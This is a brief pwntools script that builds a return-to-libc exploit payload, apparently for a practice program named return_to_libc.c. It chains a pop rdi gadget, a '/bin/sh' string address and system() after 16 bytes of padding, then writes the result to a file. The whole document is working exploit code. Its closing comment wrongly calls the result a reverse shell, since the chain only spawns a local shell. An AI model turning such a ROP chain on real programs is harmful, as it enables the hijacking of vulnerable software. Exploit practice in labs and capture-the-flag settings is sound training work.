from pwn import *

with open('payload','wb') as f:
	pass

pop_rdi = 0x00000000004012fb
binsh = 0x7ffff7f7769b 
system = 0x7ffff7e37e10

p = b'a'*16 + p64(pop_rdi)+p64(binsh)+p64(system)


with open('payload', 'wb') as f:
	f.write(p)

#creates a reverse shell for return_to_libc.c